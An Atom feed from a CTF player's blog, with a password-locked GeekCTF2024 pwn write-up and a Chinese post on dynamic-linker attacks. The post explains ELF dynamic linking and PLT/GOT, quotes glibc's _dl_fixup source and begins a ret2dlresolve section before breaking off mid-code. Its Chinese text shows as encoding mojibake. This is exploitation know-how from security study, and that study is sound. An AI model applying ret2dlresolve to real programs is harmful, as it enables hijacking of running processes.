<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Whirling-In-Rags</title>
  
  <subtitle>un jour je serai de retour pr√®s de toi</subtitle>
  <link href="http://deepunk.icu/atom.xml" rel="self"/>
  
  <link href="http://deepunk.icu/"/>
  <updated>2024-04-14T12:48:08.594Z</updated>
  <id>http://deepunk.icu/</id>
  
  <author>
    <name>DeePunk</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://deepunk.icu/Untitled/"/>
    <id>http://deepunk.icu/Untitled/</id>
    <published>2024-04-14T12:48:08.594Z</published>
    <updated>2024-04-14T12:48:08.594Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>WriteUp for GeekCTF2024</title>
    <link href="http://deepunk.icu/GeekCTF2024wp/"/>
    <id>http://deepunk.icu/GeekCTF2024wp/</id>
    <published>2024-04-14T12:29:48.000Z</published>
    <updated>2024-04-15T05:35:41.146Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0102fba61608e3a9657e84a00287b5d67c9b86e3ac22f6ef3e780fd0f11d3585"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Áî±‰∫éÁõ∏ÂÖ≥Ê≥ïÂæãÊ≥ïËßÑÔºåËØ•wpÊöÇ‰∏çÂºÄÊîæ</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">passwd</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>dlÁõ∏ÂÖ≥ÊîªÂáªÊ±áÊÄª</title>
    <link href="http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/"/>
    <id>http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/</id>
    <published>2024-03-05T13:27:55.000Z</published>
    <updated>2024-03-05T13:30:02.375Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Âä®ÊÄÅÈìæÊé•"><a href="#Âä®ÊÄÅÈìæÊé•" class="headerlink" title="Âä®ÊÄÅÈìæÊé•"></a>Âä®ÊÄÅÈìæÊé•</h1><h2 id="Êú∫Âà∂"><a href="#Êú∫Âà∂" class="headerlink" title="Êú∫Âà∂"></a>Êú∫Âà∂</h2><p>‰ΩøÁî®Âä®ÊÄÅÈìæÊé•Êó∂ÔºåÁ®ãÂ∫èÊåâÊ®°ÂùóÊãÜÂàÜ‰∏∫Â§ö‰∏™Áã¨Á´ãÈÉ®ÂàÜÔºåÂú®Á®ãÂ∫èËøêË°åÊó∂ÊâçÈìæÊé•Âú®‰∏ÄËµ∑„ÄÇlinux‰∏≠ELFÂä®ÊÄÅÈìæÊé•Êñá‰ª∂Áß∞‰∏∫Âä®ÊÄÅÂÖ±‰∫´ÂØπË±°(DSO)Ôºå‰ª•<code>.so</code>‰∏∫ÊãìÂ±ïÂêç„ÄÇÂ∏∏Áî®ÁöÑCËØ≠Ë®ÄËøêË°åÂ∫ìglibc‰øùÂ≠ò‰∏∫<code>libc.so</code>„ÄÇ</p><p>ÈìæÊé•ÁöÑÊìç‰ΩúÁî±Âä®ÊÄÅÈìæÊé•Âô®ldÂÆåÊàê„ÄÇËøêË°åÊó∂Âä®ÊÄÅÈìæÊé•Âô®‰∏éÊôÆÈÄöÂÖ±‰∫´ÂØπË±°‰∏ÄÂêåË¢´Êò†Â∞ÑÂà∞ËøõÁ®ãÁöÑÂú∞ÂùÄÁ©∫Èó¥ÔºåÁ®ãÂ∫èÂú®ËøêË°åÊó∂È¶ñÂÖàËøêË°åldÔºåÂÆåÊàêÊâÄÊúâÂä®ÊÄÅÈìæÊé•Â∑•‰ΩúÂêéÂÜçËΩ¨‰∫§‰∏ªÁ®ãÂ∫è„ÄÇ</p><p>Â¶ÇÊûúÁ®ãÂ∫è‰∏≠Â≠òÂú®Ë∑®Ê®°ÂùóÁöÑÊï∞ÊçÆËÆøÈóÆÔºåÁî±‰∫éÁõÆÊ†áÂèòÈáèÁöÑÂú∞ÂùÄË¶ÅÂú®Ë£ÖËΩΩÊó∂ÊâçËÉΩÁ°ÆÂÆöÔºåÈúÄË¶Å‰ΩøÂæóÁ®ãÂ∫è‰∏≠ÁöÑ‰ª£Á†ÅÂú∞ÂùÄÊó†ÂÖ≥„ÄÇ‰∫éÊòØÊääË∑üÂú∞ÂùÄÁõ∏ÂÖ≥ÁöÑ‰ª£Á†ÅÊîæÂú®Êï∞ÊçÆÊÆµÈáåÔºåÂç≥ÂÖ®Â±ÄÂÅèÁßªË°®(Global Offset Table)„ÄÇËá≥‰∫éÊ®°ÂùóÈó¥ÁöÑË∞ÉÁî®ÔºåË∑≥ËΩ¨Ôºå‰πüÁî®GOTË°®ÂÆûÁé∞Ôºå‰ΩÜÊòØÂá∫‰∫éÊïàÁéáËÄÉËôëÔºåÈúÄË¶ÅÂºïÂÖ•Âª∂ËøüÁªëÂÆöÊú∫Âà∂„ÄÇ</p><p>Âª∂ËøüÁªëÂÆö(Lazy Binding)ÁöÑÊÄùÊÉ≥ÊòØÂú®Á®ãÂ∫èÁ¨¨‰∏ÄÊ¨°Áî®Âà∞Êó∂ÊâçÁªëÂÆö(Á¨¶Âè∑Êü•ÊâæÔºåÈáçÂÆö‰Ωç)Ôºå‰ΩøÁî®PLTË°®(Procedure Linkage Table)ÂÆûÁé∞ÔºåÂÆûÁé∞‰ª£Á†ÅÂ¶Ç‰∏ã:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PLT0:</span><br><span class="line">push *(GOT + 4)</span><br><span class="line">jump *(GOT + 8)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">jump PLT0</span><br></pre></td></tr></table></figure><p>(Ê≠§Â§ÑÁöÑÂÆûÁé∞‰∏é‰πãÂêéÁöÑÂà©Áî®ÂØÜÂàáÁõ∏ÂÖ≥)</p><p>ÂÖ∂‰∏≠<code>bar@GOT</code>‰∏≠ÂàùÂßã‰øùÂ≠ò<code>bar@plt</code>ÁöÑ‰∏ã‰∏ÄÊù°Êåá‰ª§(ÂéüÂú∞tp)ÔºåÈöèÂêépushÁöÑnÊòØbarÂú®ÈáçÂÆö‰ΩçË°®È°π‰∏≠ÁöÑÂ∫èÂè∑„ÄÇ<code>GOT + 4</code> ‰∏≠‰øùÂ≠ò‰∏Ä‰∏™Âêç‰∏∫<code>link_map</code>ÁöÑÁªìÊûÑ‰ΩìÁöÑÂú∞ÂùÄÔºåÂÆÉ‰øùÂ≠ò‰∫ÜÊú¨Ê®°ÂùóÂä®ÊÄÅÈìæÊé•ÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØÔºå<code>GOT + 8</code>‰∏≠‰øùÂ≠ò<code>_dl_runtime_resolve()</code>ÁöÑÂú∞ÂùÄÔºåËØ•ÂáΩÊï∞ÁöÑ‰ΩúÁî®‰æøÊòØËß£Êûê<code>link_map</code>ÔºåËÆ°ÁÆóÂá∫barÂáΩÊï∞ÁöÑÁúüÊ≠£Âú∞ÂùÄÔºåÂπ∂Â∞ÜÂÖ∂Â°´ÂÖ•<code>bar@GOT</code>‰∏≠</p><h2 id="ÂÆûÁé∞ÁªìÊûÑ"><a href="#ÂÆûÁé∞ÁªìÊûÑ" class="headerlink" title="ÂÆûÁé∞ÁªìÊûÑ"></a>ÂÆûÁé∞ÁªìÊûÑ</h2><h3 id="interpÊÆµ"><a href="#interpÊÆµ" class="headerlink" title=".interpÊÆµ"></a><code>.interp</code>ÊÆµ</h3><p>‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂä®ÊÄÅËøûÊé•Âô®ÁöÑË∑ØÂæÑ</p><h3 id="dynamicÊÆµ"><a href="#dynamicÊÆµ" class="headerlink" title=".dynamicÊÆµ"></a><code>.dynamic</code>ÊÆµ</h3><p><code>readelf -d Lib.so</code>Êü•Áúã<br>‰øùÂ≠ò‰∫ÜÂä®ÊÄÅËøûÊé•Âô®ÊâÄÈúÄÁöÑÂü∫Êú¨‰ø°ÊÅØÔºåÁªìÊûÑÂ¶Ç‰∏ã</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   Elf32_Sword   d_tag;          <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">   <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">       Elf32_Word d_val;         <span class="comment">/* Integer value */</span></span><br><span class="line">       Elf32_Addr d_ptr;         <span class="comment">/* Address value */</span></span><br><span class="line">     &#125; d_un;</span><br><span class="line"> &#125; Elf32_Dyn;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Sxword d_tag; <span class="comment">/* Dynamic entry type */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">Elf64_Xword d_val; <span class="comment">/* Integer value */</span></span><br><span class="line">Elf64_Addr d_ptr; <span class="comment">/* Address value */</span></span><br><span class="line">  &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>Âú®<code>elf.h</code>‰∏≠ÂÆö‰πâ‰∫Ü‰∏çÂêåd_tagÁöÑÂÄº‰∏éÂØπÂ∫îÁ±ªÂûãÔºåÂêéÈù¢ÊØîËæÉÂ∏∏Áî®ÁöÑÊúâ</p><ul><li><code>DT_REL</code> Âä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®Âú∞ÂùÄ</li><li><code>DT_SYMTAB</code> Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®Âú∞ÂùÄ</li><li><code>DT_STRTAB</code> Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®Âú∞ÂùÄ</li><li><code>DT_INIT</code> ÂàùÂßãÂåñ‰ª£Á†ÅÂú∞ÂùÄ</li><li><code>DT_FINI</code> ÁªìÊùü‰ª£Á†ÅÂú∞ÂùÄ</li></ul><h3 id="DT-RELÂä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®"><a href="#DT-RELÂä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®" class="headerlink" title="DT_RELÂä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®"></a><code>DT_REL</code>Âä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®</h3><p><code>readelf -r Lib.so</code>Êü•Áúã<br>ÂÖ±‰∫´ÂØπË±°ÁöÑÈáçÂÆö‰ΩçÂú®Ë£ÖËΩΩÊó∂ÂÆåÊàêÔºåÈáçÂÆö‰ΩçË°®ÂàÜ‰∏∫<code>.rel.dyn</code>Âíå<code>.rel.plt</code>„ÄÇÂâçËÄÖ‰øÆÊ≠£Êï∞ÊçÆÂºïÁî®ÔºåÂç≥<code>.got</code>Âíå<code>.data</code>ÔºõÂêéËÄÖ‰øÆÊ≠£<code>.got.plt</code>„ÄÇ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Addr r_offset; <span class="comment">/* Address */</span></span><br><span class="line">Elf32_Word r_info; <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Addr r_offset; <span class="comment">/* Address */</span></span><br><span class="line">Elf64_Xword r_info; <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_SYM(val) ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_TYPE(val) ((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_INFO(sym, type) (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p><code>r_offset</code>Ë°®Á§∫ÈúÄË¶Å‰øÆÊ≠£ÁöÑÂú∞ÂùÄÔºå<code>r_info</code>È´ò‰ΩçË°®Á§∫ËØ•Á¨¶Âè∑Âú®Á¨¶Âè∑Ë°®‰∏≠ÁöÑÂ∫èÂè∑Ôºå‰Ωé‰ΩçË°®Á§∫Á¨¶Âè∑Á±ªÂûã„ÄÇ</p><h3 id="DT-SYMTAB-Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®"><a href="#DT-SYMTAB-Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®" class="headerlink" title="DT_SYMTAB Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®"></a><code>DT_SYMTAB</code> Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®</h3><p><code>readelf -sD Lib.so</code>Êü•Áúã<br>ÈÄöÂ∏∏‰øùÂ≠òÂú®ÊÆµ<code>.dynsym</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Word st_name; <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">Elf32_Addr st_value; <span class="comment">/* Symbol value */</span></span><br><span class="line">Elf32_Word st_size; <span class="comment">/* Symbol size */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">/* Symbol type and binding */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">/* Symbol visibility */</span></span><br><span class="line">Elf32_Section st_shndx; <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Word st_name; <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">/* Symbol type and binding */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">/* Symbol visibility */</span></span><br><span class="line">Elf64_Section st_shndx; <span class="comment">/* Section index */</span></span><br><span class="line">Elf64_Addr st_value; <span class="comment">/* Symbol value */</span></span><br><span class="line">Elf64_Xword st_size; <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the st_info field. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_BIND(val) (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_TYPE(val) ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_INFO(bind, type) (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_BIND(val) ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_TYPE(val) ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_INFO(bind, type) ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure><h3 id="DT-STRTAB-Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®"><a href="#DT-STRTAB-Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®" class="headerlink" title="DT_STRTAB Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®"></a><code>DT_STRTAB</code> Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®</h3><p><code>.dynstr</code>‰∏≠<br>Â≠òÂÇ®Â≠óÁ¨¶‰∏≤ÔºåÊó†ÈúÄËµòËø∞</p><h3 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a><code>link_map</code></h3><p>‰∏Ä‰∏™ÁªìÊûÑ‰ΩìÔºå‰øùÂ≠òÂä®ÊÄÅÈìæÊé•Áõ∏ÂÖ≥‰ø°ÊÅØ<br>‰ª£Á†ÅÂ§™Èïø‰∏çË¥¥ÔºåÊúâ‰∏§‰∏™ÊØîËæÉÈáçË¶ÅÁöÑÈÉ®ÂàÜ</p><ul><li><code>l_addr</code> Á®ãÂ∫èÁöÑÂü∫ÂùÄ</li><li><code>l_info[]</code>‰∏Ä‰∏™Êï∞ÁªÑÔºå‰øùÂ≠ò‰∫ÜÂ§ö‰∏™ÈáçÂÆö‰ΩçÈ°πÁöÑÂú∞ÂùÄ</li></ul><h3 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h3><p>Ë∞ÉÁî®<code>_dl_runtime_resolve</code>Êó∂Ôºå‰º†ÂèÇ<code>link_map</code>Âíå<code>rel_offset</code>ÔºåÊü•ÊâæÊµÅÁ®ãÂ¶Ç‰∏ã</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset)</span><br><span class="line">                                       +</span><br><span class="line">          +-----------+                |</span><br><span class="line">          | Elf32_Rel | &lt;--------------+</span><br><span class="line">          +-----------+</span><br><span class="line">     +--+ | r_offset  |        +-----------+</span><br><span class="line">     |    |  r_info   | +----&gt; | Elf32_Sym |</span><br><span class="line">     |    +-----------+        +-----------+      +----------+</span><br><span class="line">     |      .rel.plt           |  st_name  | +--&gt; | system\<span class="number">0</span> |</span><br><span class="line">     |                         |           |      +----------+</span><br><span class="line">     v                         +-----------+        .dynstr</span><br><span class="line">+----+-----+                      .dynsym</span><br><span class="line">| &lt;system&gt; |</span><br><span class="line">+----------+</span><br><span class="line">  .got.plt</span><br></pre></td></tr></table></figure><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><h2 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h2><p>Ë∞ÉÁî®<code>_dl_runtime_resolve</code>ÂêéÔºåÂÆûÈôÖÂÆåÊàêÁªëÂÆöÂ∑•‰ΩúÁöÑÊòØÂÖ∂‰∏≠Ë∞ÉÁî®ÁöÑ<code>_dl_fixup</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">first time each PLT entry is called. We must perform the relocation</span></span><br><span class="line"><span class="comment">specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">to that address. Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">function. */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uintptr_t</span> pltgot = (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">+ reloc_offset (pltgot, reloc_arg));</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line"><span class="type">lookup_t</span> result;</span><br><span class="line">DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation. */</span></span><br><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up the target symbol. If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">used don&#x27;t look in the global scope. */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">  (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We need to keep the scope around so do some locking. This is</span></span><br><span class="line"><span class="comment">not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">we are not using any threads (yet). */</span></span><br><span class="line"><span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line"><span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">  &#123;</span><br><span class="line">THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">result = 